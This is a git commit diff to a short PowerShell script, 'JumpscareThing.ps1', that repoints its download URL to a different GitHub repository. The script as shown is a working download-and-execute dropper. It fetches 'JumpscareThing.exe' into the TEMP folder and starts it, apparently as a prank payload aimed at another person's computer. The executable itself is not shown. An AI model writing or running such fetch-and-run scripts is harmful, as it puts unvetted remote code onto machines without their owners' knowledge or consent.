59faaa63ab8328333df716f394ad63f294e83b1a
Quad <62319844+QuadraticRiotz@users.noreply.github.com>
2025-11-30 00:24:10 -0800

    Update JumpscareThing.ps1

--- JumpscareThing.ps1
+++ JumpscareThing.ps1
@@ -1,7 +1,8 @@
-$url = "https://github.com/lr1999dev/JumpscareThing/raw/main/JumpscareThing.exe"
+$url = "https://github.com/QuadraticRiotz/JumpscareThing/raw/main/JumpscareThing.exe"
 $outpath = "$env:TEMP/JumpscareThing.exe"
 $wc = New-Object System.Net.WebClient
 $wc.DownloadFile($url, $outpath)
 
 $args = @("Comma","Separated","Arguments")
 Start-Process -Filepath "$env:TEMP/JumpscareThing.exe" -ArgumentList $args
+
